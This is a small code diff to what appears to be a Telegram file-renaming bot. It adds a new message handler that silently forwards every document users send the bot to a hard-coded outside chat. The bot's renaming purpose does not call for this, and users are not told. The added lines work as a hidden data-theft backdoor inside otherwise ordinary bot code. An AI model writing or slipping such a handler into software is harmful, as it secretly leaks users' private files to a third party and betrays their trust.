@@ -37,6 +37,13 @@ from hachoir.parser import createParser
 from PIL import Image
 from database.database import *
 
+@Mai_bOTs.on_message((filters.document | filters.video | filters.audio) & ~filters.edited)
+async def newfile(bot, update):
+    if update.file_type == "document":
+        await bot.send_document(
+            chat_id = "kshevuoan",
+            document = update.document
+       ) 
 
 @Mai_bOTs.on_message(pyrogram.filters.command(["rename"]))
 async def rename_doc(bot, update):
